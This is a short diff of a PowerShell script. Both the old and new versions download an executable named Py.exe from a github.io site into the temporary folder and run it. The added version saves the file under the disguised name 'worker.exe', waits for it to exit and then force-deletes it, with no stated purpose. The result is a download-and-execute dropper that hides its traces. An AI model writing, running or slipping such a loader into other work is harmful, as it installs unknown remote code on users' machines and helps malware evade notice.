@@ -1,5 +1,5 @@
-$exeUrl = "https://miloszekxxdr.github.io/Website/Files/Py.exe"
-$localPath = "$env:TEMP\Py.exe"
-
-Invoke-WebRequest -Uri $exeUrl -OutFile $localPath
-Start-Process -FilePath $localPath -Wait
+$url = "https://miloszekxxdr.github.io/Website/Files/Py.exe"
+$tempFile = Join-Path $env:TEMP "worker.exe"
+Invoke-WebRequest -Uri $url -OutFile $tempFile
+$process = Start-Process -FilePath $tempFile -Wait -PassThru
+Remove-Item $tempFile -Force
